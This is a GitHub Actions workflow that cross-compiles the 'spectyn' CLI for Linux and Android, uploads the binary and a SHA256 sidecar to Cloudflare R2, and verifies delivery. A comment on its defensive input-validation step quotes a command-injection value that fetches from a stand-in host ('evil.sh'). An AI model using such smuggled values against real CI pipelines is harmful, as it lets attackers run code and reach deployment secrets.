name: Publish spectyn binary to R2

# On-demand build of the `spectyn` CLI binary for a specific target
# triple, then upload to the spectyn-binaries R2 bucket so the public
# install scripts (https://phantommesh.io/install.{ps1,sh}) serve it.
#
# Why this exists separately from release-daemon.yml:
#   - release-daemon.yml builds the OLDER `spectyn-mesh` daemon binary
#     into GitHub Releases, not R2
#   - This builds the NEWER `spectyn` CLI (src/bin/spectyn.rs) and pushes
#     to R2 directly so the install one-liners pick it up
#   - Triggered manually so we don't accidentally publish every push
#
# Target choices (workflow_dispatch input)
# ----------------------------------------
#   x86_64-unknown-linux-gnu    → cloud / desktop Linux (glibc 2.31+)
#     R2 object name (default): spectyn-linux-x86_64
#     Linker: stock gcc on ubuntu-22.04
#
#   aarch64-unknown-linux-gnu   → ARM cloud nodes (Oracle Ampere, AWS Graviton, Raspberry Pi 4/5)
#     R2 object name (default): spectyn-linux-aarch64
#     Linker: gcc-aarch64-linux-gnu (apt-installed)
#
#   aarch64-linux-android       → Android (Termux on aarch64 phones/tablets)
#     R2 object name (default): spectyn-aarch64-linux-android
#     Toolchain: Android NDK r28 (28.2.13676358) via android-actions/setup-android
#                + cargo-ndk (matches .github/workflows/ci-android.yml so the
#                build artifact has the same Bionic-only ELF profile that
#                ci-android.yml gates on every PR)
#     Consumer: scripts/bring-up/setup-android-termux.sh (PR #196) pulls
#               from https://phantommesh.io/dist/spectyn-aarch64-linux-android
#
# All three targets share the same SHA256 sidecar contract:
# `<r2_object_name>.sha256` is uploaded alongside the binary and
# scripts/_verify-download.sh fetches it from `<binary-url>.sha256`.

on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Rust target triple to build for'
        required: true
        default: 'x86_64-unknown-linux-gnu'
        type: choice
        options:
          - x86_64-unknown-linux-gnu
          - aarch64-unknown-linux-gnu
          - aarch64-linux-android
      r2_object_name:
        description: 'R2 object key (the install scripts look for these specific names — see top-of-file table)'
        required: true
        default: 'spectyn-linux-x86_64'
        type: string

env:
  CARGO_TERM_COLOR: always
  CARGO_INCREMENTAL: 0
  # Match ci-android.yml so the published binary is built with the same
  # NDK that gates per-PR (no ABI / linker drift between gate and ship).
  NDK_VERSION: '28.2.13676358'

jobs:
  build-and-publish:
    name: Build spectyn + upload to R2
    # bullseye-equivalent base. ubuntu-24.04 ships glibc 2.39 which is too
    # new for OL9 / RHEL 8 / Ubuntu 20.04. Pin to ubuntu-22.04 for glibc
    # 2.35 — wider compat. Eventually swap to a slim-bullseye container if
    # OL9 users (glibc 2.34) report breakage.
    #
    # Note: for `aarch64-linux-android` the host-glibc floor is irrelevant
    # (the Android binary links against Bionic via the NDK sysroot, not
    # against ubuntu-22.04's glibc). ubuntu-22.04 just hosts the NDK.
    runs-on: ubuntu-22.04
    timeout-minutes: 30

    steps:
      - uses: actions/checkout@v4

      # C12 / T81 (V11 H-2): both inputs flow into shell commands and the
      # cache key. `target` is `type: choice` (GitHub-validated) but
      # `r2_object_name` is unconstrained `type: string` and previously
      # went straight into wrangler/curl arg lists — a workflow_dispatch
      # caller could smuggle `"; curl evil.sh; #` through it. Validate
      # both with strict allowlists up front, then propagate the
      # sanitized values via env vars instead of `${{ inputs.* }}`
      # interpolation in `run:` blocks.
      - name: Validate workflow inputs
        env:
          TARGET_RAW: ${{ inputs.target }}
          R2_OBJECT_NAME_RAW: ${{ inputs.r2_object_name }}
        run: |
          set -euo pipefail

          # target: enum allowlist (must match `type: choice` options above
          # — also enforced here as defense-in-depth in case `choice` is
          # ever relaxed or bypassed via API).
          case "$TARGET_RAW" in
            x86_64-unknown-linux-gnu|aarch64-unknown-linux-gnu|aarch64-linux-android)
              ;;
            *)
              echo "::error::target must be one of: x86_64-unknown-linux-gnu, aarch64-unknown-linux-gnu, aarch64-linux-android (got: $TARGET_RAW)"
              exit 1
              ;;
          esac

          # r2_object_name: allow alnum, dot, dash, underscore only. No
          # slash (prevents bucket-path escape), no whitespace, no shell
          # metacharacters. Length-bound to 128 to reject pathological
          # payloads.
          if ! [[ "$R2_OBJECT_NAME_RAW" =~ ^[a-zA-Z0-9_.-]+$ ]]; then
            echo "::error::r2_object_name must match ^[a-zA-Z0-9_.-]+$ (got: $R2_OBJECT_NAME_RAW)"
            exit 1
          fi
          if [ "${#R2_OBJECT_NAME_RAW}" -gt 128 ]; then
            echo "::error::r2_object_name too long (max 128 chars)"
            exit 1
          fi

          echo "TARGET=$TARGET_RAW" >> "$GITHUB_ENV"
          echo "R2_OBJECT_NAME=$R2_OBJECT_NAME_RAW" >> "$GITHUB_ENV"

      # ── Android NDK toolchain (android target only) ──────────────────────
      # cargo-ndk wraps cargo with the right --target + linker config so
      # we don't have to hand-roll [target.aarch64-linux-android] in
      # cargo/config.toml. This matches .github/workflows/ci-android.yml
      # exactly so a successful PR-gate is a meaningful signal for ship.
      - name: Setup Java (Android NDK only)
        if: inputs.target == 'aarch64-linux-android'
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'

      - name: Setup Android SDK (Android NDK only)
        if: inputs.target == 'aarch64-linux-android'
        uses: android-actions/setup-android@v3

      - name: Install Android NDK ${{ env.NDK_VERSION }}
        if: inputs.target == 'aarch64-linux-android'
        run: |
          sdkmanager "ndk;${NDK_VERSION}"
          NDK_HOME="$ANDROID_SDK_ROOT/ndk/${NDK_VERSION}"
          echo "ANDROID_NDK_HOME=$NDK_HOME" >> "$GITHUB_ENV"
          echo "ANDROID_NDK_ROOT=$NDK_HOME" >> "$GITHUB_ENV"

      - name: Install Rust stable + target
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: ${{ inputs.target }}

      - name: Cache cargo
        uses: actions/cache@v4
        with:
          path: |
            ~/.cargo/registry
            ~/.cargo/git
            core/target
          # Safe: `inputs.target` is GitHub-validated `type: choice` and
          # additionally enum-checked above, so it can only be one of
          # the three known triples. Used here in the cache key (not
          # shell), and cache-key interpolation isn't a shell-injection
          # sink — worst case is a cache miss.
          key: spectyn-${{ inputs.target }}-${{ hashFiles('**/Cargo.lock') }}
          restore-keys: spectyn-${{ inputs.target }}-

      - name: Install cross-compile linker (aarch64-linux-gnu only)
        if: inputs.target == 'aarch64-unknown-linux-gnu'
        run: |
          sudo apt-get update
          sudo apt-get install -y gcc-aarch64-linux-gnu
          echo "[target.aarch64-unknown-linux-gnu]" >> $HOME/.cargo/config.toml
          echo 'linker = "aarch64-linux-gnu-gcc"' >> $HOME/.cargo/config.toml

      - name: Install cargo-ndk (Android NDK only)
        if: inputs.target == 'aarch64-linux-android'
        run: cargo install cargo-ndk --locked

      # ── Build ────────────────────────────────────────────────────────────
      # Two build paths: stock cargo for linux-gnu, cargo-ndk for android.
      # `-P 21` pins minSdkVersion=21 (Android 5.0+) — same as ci-android.yml.
      - name: Build spectyn binary (linux-gnu)
        if: inputs.target != 'aarch64-linux-android'
        working-directory: core
        run: cargo build --release --bin spectyn --target "$TARGET"

      - name: Build spectyn binary (android NDK)
        if: inputs.target == 'aarch64-linux-android'
        working-directory: core
        run: cargo ndk -t arm64-v8a -P 21 build --release --bin spectyn

      - name: Verify binary
        run: |
          BIN="core/target/${TARGET}/release/spectyn"
          ls -la "$BIN"
          file "$BIN"
          if [ "$TARGET" = "aarch64-linux-android" ]; then
            # Android: must be EM_AARCH64 + must not link against glibc.
            # ci-android.yml does the full ELF-sanity gate on every PR;
            # we re-check the two cheapest invariants here as a tripwire
            # against accidental host-cargo builds slipping through.
            NDK_BIN="$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin"
            "$NDK_BIN/llvm-readobj" --file-headers "$BIN" | grep -q "EM_AARCH64" \
              || { echo "::error::not an aarch64 ELF — refusing to publish"; exit 1; }
            if "$NDK_BIN/llvm-objdump" -T "$BIN" 2>/dev/null | grep -q "GLIBC_"; then
              echo "::error::android binary has GLIBC symbols — refusing to publish"
              exit 1
            fi
            echo "✓ aarch64 ELF, Bionic-only (no GLIBC syms)"
          else
            # Linux-gnu targets: print max GLIBC symbol dependency so we
            # know the floor distro. See memory/crosscompile-gotchas.md
            # — bullseye-floor (2.31) is the goal; bookworm (2.36+) is
            # fine; trixie (2.39) is too new.
            if command -v objdump > /dev/null; then
              echo "Max GLIBC dep:"
              objdump -T "$BIN" 2>/dev/null | grep -oE 'GLIBC_[0-9.]+' | sort -V | uniq -c | tail -5 || echo "  (no GLIBC deps — likely musl or static)"
            fi
          fi

      - name: Generate SHA256 sidecar
        # Emit the sidecar that scripts/_verify-download.sh expects at
        # "<binary-url>.sha256". Format matches sha256sum so the bash
        # helper's `awk '{print $1}'` picks up the hex digest correctly.
        run: |
          BIN="core/target/${TARGET}/release/spectyn"
          SUMS="$BIN.sha256"
          # Use the public object name so the sidecar's filename column
          # matches what users actually download.
          ( cd "$(dirname "$BIN")" && sha256sum "$(basename "$BIN")" ) \
            | sed "s| $(basename "$BIN")$|  ${R2_OBJECT_NAME}|" \
            > "$SUMS"
          echo "── $SUMS ──"
          cat "$SUMS"

      - name: Upload to R2 via wrangler
        working-directory: spectynmesh-io
        env:
          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
        run: |
          BIN="../core/target/${TARGET}/release/spectyn"
          SUMS="$BIN.sha256"
          # Upload the binary first
          npx wrangler r2 object put "spectyn-binaries/${R2_OBJECT_NAME}" \
            --file "$BIN" \
            --content-type application/octet-stream
          # Then its sidecar at "<name>.sha256" — the path
          # scripts/_verify-download.sh fetches.
          npx wrangler r2 object put "spectyn-binaries/${R2_OBJECT_NAME}.sha256" \
            --file "$SUMS" \
            --content-type text/plain

      - name: Verify R2 edge serves the new binary + sidecar
        run: |
          sleep 3
          # Cache-bust to bypass any stale CF edge state.
          curl -sSI "https://phantommesh.io/dist/${R2_OBJECT_NAME}?cb=$(date +%s)" | \
            grep -iE 'Content-Length|ETag'
          echo
          echo "✓ ${R2_OBJECT_NAME} live at https://phantommesh.io/dist/${R2_OBJECT_NAME}"
          echo
          echo "── sidecar fetch ──"
          curl -fsSL "https://phantommesh.io/dist/${R2_OBJECT_NAME}.sha256?cb=$(date +%s)"
          echo "✓ sidecar live at https://phantommesh.io/dist/${R2_OBJECT_NAME}.sha256"
